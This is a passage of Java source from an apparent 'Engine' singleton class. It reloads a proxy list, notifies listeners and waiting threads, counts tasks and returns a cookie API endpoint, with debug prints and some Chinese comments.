				this.proxies.clear();
				for(int i=0;i<ps.length;i++){
					proxies.add(ps[i]);
				}
				
				System.err.println("reloading proxies 2:"+proxies.size());
				//显示代理数量
				List<String> params = new ArrayList<String>();
				params.add(String.valueOf(proxies.size()));
	
				EngineMessage msg = new EngineMessage();
				msg.setType(EngineMessageType.OM_PROXY_LOADED);
				msg.setData(params);
				notify(msg);
				
				System.err.println("reloading proxies 3");
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		System.err.println("reloading proxies 4");
//		msg = new EngineMessage();
//		msg.setTid(-1);//通知所有线程
//		msg.setType(EngineMessageType.OM_RELOAD_PROXIES);
//		notify(msg);
//		notify(msg);
		
		info("");
		info("================");
		info("更新完毕: ["+proxies.size()+"]");
		info("================");
		info("");

		System.err.println("reloading proxies 5");
		reload = false;
		
		synchronized(SyncUtil.RELOAD_PROXY_OBJECT){
			try{
				SyncUtil.RELOAD_PROXY_OBJECT.notifyAll();//更新完毕，唤醒线程
			}catch(Exception e){
				//
			}
		}
		
		System.err.println("reloading proxies 6");
		ready();
	}

	public synchronized void beginTask(){
		bc++;
	}
	
	public synchronized void endTask(){
		ec++;
//		if(ec==bc&&reload){
//			reload = false;
//			reloadProxies();
//		}
	}
	
	public static Engine getInstance() {
		synchronized (Engine.class) {
			if (instance == null) {
				instance = new Engine();
			}
		}
		return instance;
	}

	public String getCookieAPI(){
		return cookieAPIs[urlidx];
	}
}
